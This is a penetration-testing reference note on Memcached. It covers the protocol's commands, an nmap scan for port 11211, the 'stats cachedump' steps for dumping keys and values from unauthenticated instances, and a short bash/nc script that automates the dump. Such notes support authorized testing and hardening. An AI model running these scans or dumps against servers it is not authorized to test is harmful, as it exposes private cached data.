# Memcached

### Overview

Memcached is a distributed in-memory key-value store caching system. It is often
used to speed up dynamic database-driven websites by caching data and objects
in RAM to reduce the number of times an external data source (such as a
database or API) must be read.

Memcached is a free and open-source software written in	C, that runs on
Unix-like operating systems (at least Linux and OS X) and on Microsoft Windows.

Memcached's APIs provide a very large hash table distributed across multiple
machines. When the table is full, subsequent inserts cause older data to be
purged in least recently used (LRU) order. Expired items are removed first then
the least used items are overwritten so that the frequently requested
information can be retained in memory.

Memcached is widely used for large scale web application, including major
players like YouTube, Reddit, Facebook, Twitter, and Wikipedia.

Memcached supports the only following data structure, called an "item" which
consists of:
  - A key (arbitrary string up to 250 bytes in length. No space or newlines
    for ASCII mode)
  - A 32bit "flag" value
  - An expiration time, in seconds.
    '0' means never expire. Can be up to 30 days.
  - A 64bit "CAS" value, which is kept unique.
  - Arbitrary item data

###### Supported commands

Memcached handles a small number of basic commands:

| Command | Description | Example |
|---------|-------------|---------|
| version | Print memcached version | version |
| verbosity | Increases log level | verbosity |
| stats | Prints general memcached instance statistics | stats |
| stats slabs | Prints memory statistics including number of active slabs | stats slabs |
| stats items | Prints items stored broken down by slab | stats items <br/> STAT items:<SLAB_ID\>:number 1 <br/> ... |
| stats cachedump <SLAB_ID/> <NUMBER_OF_KEYS/> | Undocumented command that still exists in 1.4.5 but might be removed at anytime. <br/> Prints keys per slab id, limited to dump of one page (1MB of data) | stats cachedump 3 100 |   
| stats malloc <br/> stats detail <br/> stats sizes <br/> stats reset | Prints others statistics information | stats ... |
| get <KEY\> |	Reads the value associated to the specified key | get key1 |
| set <KEY\> <FLAGS\> <TTL\> <SIZE\> <DATA\> |	Set a key and its associated parameters and data | set key1 0 60 4 \r\ndata\r\n |
| add	<KEY\> <FLAGS\> <TTL\> <SIZE\> <DATA\> | Add a new key and its associated parameters and data | add key2 0 60 5 \r\ndata2\r\n |
| replace	<KEY\> <FLAGS\> <TTL\> <SIZE\> <DATA\> | Overwrite existing key and its associated parameters and data | add key1 0 60 5 \r\ndata1\r\n |
| append <KEY\> <FLAGS\> <TTL\> <SIZE\> <DATA\> | Append data to the specified existing key | append key2 0 60 15 |
| prepend <KEY\> <FLAGS\> <TTL\> <SIZE\> <DATA\> |	Prepend data to existing key | prepend key2 0 60 15 |
| incr <KEY\> <NUMBER\> | Increments numerical key value by given number | incr key_int 2 |
| decr <KEY\> <NUMBER\> | Decrements numerical key value by given number | decr key_int 2 |
| delete <KEY\> | Deletes the specified existing key | delete key2 |
| flush_all |	Invalidate all items immediately | flush_all |
| flush_all <N\> |	Invalidate all items in the specified number of seconds | flush_all 60 |
| quit | Terminate current session | quit|

### Network scan

`nmap` can be used to scan the network for memcached services:

```
# memcached supports both TCP and UDP
nmap -sS -sU -v -p 11211 -sV -sC -oA nmap_memcached <RANGE | CIDR>
```

### Unrestricted keys dumping

As most deployments of memcached are within trusted networks, no authentication
mechanism is implemented by default. Thus clients may connect freely to the
memcached instance to retrieve the content cached, which may contain sensible
information.

The dumping of the keys and their associated data relies on the undocumented
command `stats cachedump`, which is needed to retrieve the keys. The command
could be removed at anytime.

The process to dump the memcached keys and values is as follow:

```
# Retrieve slabs identifier
stats items
-> STAT items:<SLAB_ID>:...

# Retrieve the keys within the slab specified. Maximum number of keys: 1000
stats cachedump <SLAB_ID> <NUMBER_OF_KEYS>
-> ITEM <KEY> [24625 b; 1549536086 s] ...

# Retrieve the data associated to the key specified
get <KEY>
-> VALUE <KEY> 0 24625 <DATA>
```

The following bash script, courtesy of Omar Al-Ithawi, can be used to automate
the process above. Note that the script is not adapted for larger memcached
instance.

```
#!/usr/bin/env bash

echo 'stats items'  \
| nc <HOST> 11211  \
| grep -oe ':[0-9]*:'  \
| grep -oe '[0-9]*'  \
| sort  \
| uniq  \
| xargs -L1 -I{} bash -c 'echo "stats cachedump {} 1000" | nc <HOST> 11211'
```
